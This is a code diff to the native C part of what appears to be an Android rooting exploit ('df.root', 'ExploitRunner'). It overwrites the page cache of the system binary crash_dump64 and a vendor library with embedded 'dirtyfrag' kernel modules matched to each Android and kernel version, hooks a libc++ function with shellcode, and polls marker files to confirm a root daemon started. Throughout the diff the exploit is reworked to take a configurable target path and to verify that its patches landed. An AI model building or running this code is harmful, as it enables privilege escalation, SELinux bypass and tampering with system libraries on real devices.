@@ -17,6 +17,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <jni.h>
+#include "reporter.h"
 #include "aes256.h"
 #include "hmac_sha256.h"
 
@@ -30,7 +31,6 @@ JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
     return JNI_VERSION_1_4;
 }
 
-struct Reporter { JNIEnv *env; jobject obj; };
 
 struct PatchRestore {
     const char *lib;
@@ -42,8 +42,7 @@ struct PatchRestore {
     int      valid;
 };
 
-static void reportfmt(struct Reporter *r, const char *fmt, ...) __attribute__((__format__(printf, 2, 3)));
-static void reportfmt(struct Reporter *r, const char *fmt, ...) {
+void reportfmt(struct Reporter *r, const char *fmt, ...) {
     if (!r) return;
     va_list va; va_start(va, fmt);
     char buf[1024]; vsnprintf(buf, sizeof(buf), fmt, va);
@@ -52,10 +51,10 @@ static void reportfmt(struct Reporter *r, const char *fmt, ...) {
     (*r->env)->ExceptionClear(r->env);
     (*r->env)->DeleteLocalRef(r->env, s);
 }
-#define REPORTLN(fmt, ...) reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__)
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
-static const char target_lib_path[] = "/vendor/lib64/libbinderdebug.so";
+static char    *libcxx_ko_target;
+static uint8_t *libcxx_soft_reboot;
 
 /* SA parameters set by Java via nativeRunAll() before any patching. */
 static int      g_encap_port;
@@ -101,7 +100,7 @@ static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *r
             if (dup2(rdpipe[1], 0) < 0) _exit(1);
             close(rdpipe[1]);
         }
-        execl(kCrashDump, "crashdump64", offstr, target_lib_path, "r", NULL);
+        execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, "r", NULL);
         _exit(1);
     }
     close(rdpipe[1]);
@@ -112,14 +111,22 @@ static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *r
         n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
     close(rdpipe[0]);
     if (n != 16) {
-        if (WIFEXITED(status))
-            REPORTLN("read_vendor at 0x%lx got %d bytes (exit %d)",
-                     (long)offset, n, WEXITSTATUS(status));
-        else if (WIFSIGNALED(status))
-            REPORTLN("read_vendor at 0x%lx got %d bytes (signal %d)",
+        if (WIFEXITED(status)) {
+            static const char *const exit_meanings[] = {
+                [0] = "success",
+                [1] = "open vendor file failed or read returned < 16 bytes",
+                [2] = "write to pipe returned < 16 bytes",
+                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
+            };
+            int ec = WEXITSTATUS(status);
+            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
+            REPORTLN("read_vendor at 0x%lx got %d bytes: %s",
+                     (long)offset, n, meaning);
+        } else if (WIFSIGNALED(status))
+            REPORTLN("read_vendor at 0x%lx got %d bytes: signal %d",
                      (long)offset, n, WTERMSIG(status));
         else
-            REPORTLN("read_vendor at 0x%lx got %d bytes (status 0x%x)",
+            REPORTLN("read_vendor at 0x%lx got %d bytes: status 0x%x",
                      (long)offset, n, status);
         return -1;
     }
@@ -170,7 +177,7 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
         if (pid < 0) { REPORTLN("vfork failed: %s", strerror(errno)); goto out_pipe; }
         if (pid == 0) {
             if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
-            execl(kCrashDump, "crashdump64", offstr, target_lib_path, NULL);
+            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
             _exit(1);
         }
         int st;
@@ -292,14 +299,12 @@ extern char libcxx_start[];
 extern char libcxx_data[];
 extern uint32_t libcxx_len;
 extern char libcxx_first_inst_copy[];
-extern char libc_start[];
-extern char libc_data[];
-extern uint32_t libc_len;
-extern char libc_first_inst_copy[];
-extern uint32_t libc_soft_reboot_off;
+extern uint32_t libcxx_ko_target_off;
+extern uint32_t libcxx_soft_reboot_off;
 
 int find_hook_target(const char *lib, const char *sym,
-                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn);
+                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
+                     struct Reporter *reporter);
 
 asm(
     ".section .rodata\n"
@@ -311,8 +316,6 @@ asm(
     "dirtyfrag_ko_13_5_15_start:\n.incbin \"ko/dirtyfrag-android13-5.15.ko\"\ndirtyfrag_ko_13_5_15_end:\n"
     ".global dirtyfrag_ko_14_5_15_start\n.global dirtyfrag_ko_14_5_15_end\n"
     "dirtyfrag_ko_14_5_15_start:\n.incbin \"ko/dirtyfrag-android14-5.15.ko\"\ndirtyfrag_ko_14_5_15_end:\n"
-    ".global dirtyfrag_ko_14_6_1_start\n.global dirtyfrag_ko_14_6_1_end\n"
-    "dirtyfrag_ko_14_6_1_start:\n.incbin \"ko/dirtyfrag-android14-6.1.ko\"\ndirtyfrag_ko_14_6_1_end:\n"
     ".global dirtyfrag_ko_15_6_6_start\n.global dirtyfrag_ko_15_6_6_end\n"
     "dirtyfrag_ko_15_6_6_start:\n.incbin \"ko/dirtyfrag-android15-6.6.ko\"\ndirtyfrag_ko_15_6_6_end:\n"
     ".global dirtyfrag_ko_16_6_12_start\n.global dirtyfrag_ko_16_6_12_end\n"
@@ -331,7 +334,6 @@ extern char dirtyfrag_ko_12_5_10_start[], dirtyfrag_ko_12_5_10_end[];
 extern char dirtyfrag_ko_13_5_10_start[], dirtyfrag_ko_13_5_10_end[];
 extern char dirtyfrag_ko_13_5_15_start[], dirtyfrag_ko_13_5_15_end[];
 extern char dirtyfrag_ko_14_5_15_start[], dirtyfrag_ko_14_5_15_end[];
-extern char dirtyfrag_ko_14_6_1_start[],  dirtyfrag_ko_14_6_1_end[];
 extern char dirtyfrag_ko_15_6_6_start[],  dirtyfrag_ko_15_6_6_end[];
 extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
 extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];
@@ -345,7 +347,6 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
         {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
         {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
         {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
-        {14, 6,  1, dirtyfrag_ko_14_6_1_start,  dirtyfrag_ko_14_6_1_end},
         {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
         {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
         {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
@@ -380,11 +381,12 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
     return buf;
 }
 
+
 static int patch_ko(struct Reporter *reporter) {
     /* pick KO image */
     int andr = 0, major = 0, minor = 0;
     if (read_device_versions(&andr, &major, &minor) != 0) {
-        REPORTLN("version check failed"); return 1;
+        REPORTLN("Unable to match kernel version - possibly unsupported Non-GKI device"); return 1;
     }
     const struct KoImage *ko = select_ko_image(andr, major, minor);
     if (!ko) {
@@ -404,16 +406,32 @@ static int patch_ko(struct Reporter *reporter) {
     if (!sh_buf) return -1;
     REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
     int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
+    if (ret) { free(sh_buf); REPORTLN("patch #1 failed: %d", ret); return ret; }
+
+    // Verify patch #1 actually landed in the page cache.
+    {
+        uint8_t verify[16];
+        int vfd = open(kCrashDump, O_RDONLY);
+        if (vfd >= 0) {
+            ssize_t n = pread(vfd, verify, 16, 16);
+            close(vfd);
+            if (n == 16 && memcmp(verify, sh_buf + 16, 16) != 0) {
+                REPORTLN("patch #1 verify FAILED: page cache not modified");
+                free(sh_buf);
+                return -1;
+            }
+            REPORTLN("patch #1 verify OK");
+        }
+    }
     free(sh_buf);
-    if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
-    REPORTLN("* patch #2 (libbinderdebug.so ← dirtyfrag.ko, %zu bytes)", ko_len_padded);
-    ret = patch_file_cbc(target_lib_path, ko_buf, ko_len_padded, 0, 1, reporter);
+    REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
+    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
     free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
     return ret;
@@ -424,7 +442,7 @@ static int patch_hook(const char *lib, const char *sym,
                       char *first_inst_copy,
                       struct Reporter *reporter, struct PatchRestore *restore) {
     uint64_t hook_off, shell_off; uint32_t first_insn;
-    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn)) {
+    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, reporter)) {
         REPORTLN("find %s hook target failed", lib); return 1;
     }
     REPORTLN("%s hook=0x%lx shell=0x%lx len=%u", lib, hook_off, shell_off, stage_len);
@@ -520,8 +538,9 @@ static int createOrphanProcess(struct Reporter *reporter) {
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
 JNIEXPORT jint JNICALL
-Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
+Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
                                                jobject reporter_obj,
+                                               jstring koTargetPath,
                                                jint encapPort, jint spi,
                                                jbyteArray aesCbcKey,
                                                jbyteArray hmacKey, jint icvLen,
@@ -543,15 +562,20 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
     memcpy(g_hmac_key, hb, 32);
     (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
 
-    libc_data[libc_soft_reboot_off] = softReboot ? 1 : 0;
+    libcxx_ko_target   = libcxx_data + libcxx_ko_target_off;
+    const char *p = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
+    if (p) {
+        strncpy(libcxx_ko_target, p, 63);
+        libcxx_ko_target[63] = '\0';
+        (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
+    }
+    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
+    *libcxx_soft_reboot = softReboot ? 1 : 0;
 
-    struct PatchRestore libc_r = {0}, libcxx_r = {0};
+    struct PatchRestore libcxx_r = {0};
 
     int rc = 3;
     if (patch_ko(reporter)) goto done;
-    if (patch_hook("/system/lib64/libc.so", "__libc_init",
-                   libc_data, libc_len, libc_start, libc_first_inst_copy,
-                   reporter, &libc_r)) goto done;
     if (patch_hook("/system/lib64/libc++.so",
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                    libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
@@ -565,30 +589,22 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
     static const struct {
         const char *path;
         const char *msg;
+        int         rc;
     } markers[] = {
-        { "/dev/df",    "1. libc++: mutex acquired, forking"       },
-        { "/dev/dfm0",  "2. libc: module loaded - selinux permissive" },
-        { "/dev/dfm1",  "3. switching namespace"                   },
-        { "/dev/dfm2",  "4. bind mounting logcat"                  },
-        { "/dev/dfm3",  "5. ksud exited ok"                        },
-        { "/dev/dfm4",  "5. ksud exited with error"                },
+        { "/dev/df",   "libc++: mutex acquired, loading custom module", -1 },
+        { "/dev/dfm0", "***SUCCESS***",                        0 },
+        { "/dev/dfm1", "***FAILED***: ksud exited with error", 1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
-    for (int elapsed = 0; elapsed < 30000; elapsed += 10) {
+    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
             if (!seen[j] && has_marker(markers[j].path)) {
                 seen[j] = 1;
                 REPORTLN("%s", markers[j].msg);
-                if (strcmp(markers[j].path, "/dev/dfm3") == 0) {
-                    REPORTLN("***SUCCESS***");
-                    rc = 0;
-                    goto done;
-                }
-                if (strcmp(markers[j].path, "/dev/dfm4") == 0) {
-                    REPORTLN("***FAILED***: ksud exited with error");
-                    rc = 1;
+                if (markers[j].rc >= 0) {
+                    rc = markers[j].rc;
                     goto done;
                 }
             }
@@ -599,9 +615,7 @@ done:
     if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
     REPORTLN("\n=== cleanup ===");
     restore_hook(&libcxx_r, reporter);
-    restore_hook(&libc_r, reporter);
     fadvise_drop(kCrashDump, reporter);
     free(libcxx_r.shell_orig);
-    free(libc_r.shell_orig);
     return rc;
 }
